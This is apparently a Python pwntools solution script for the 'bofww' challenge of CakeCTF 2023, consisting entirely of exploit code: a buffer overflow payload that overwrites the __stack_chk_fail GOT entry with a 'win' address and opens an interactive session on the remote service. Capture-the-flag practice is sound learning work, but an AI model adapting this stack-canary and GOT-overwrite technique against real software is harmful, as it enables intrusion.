#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bofww", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc bofww.2023.cakectf.com 9002"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

win = 0x00000000004012f6
stack_chk_fail_got = elf.got["__stack_chk_fail"]
payload = b""
payload += p64(win)
payload = payload.ljust(0x130, b"\x00")
payload += flat(
    stack_chk_fail_got,
    0,
    0x3  # std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_replace(unsigned long, unsigned long, char const*, unsigned long)+0x4a --> need to be >= strlen(_name)  # noqa
)
io.sendline(payload)
io.sendline(b"1337")

io.interactive()
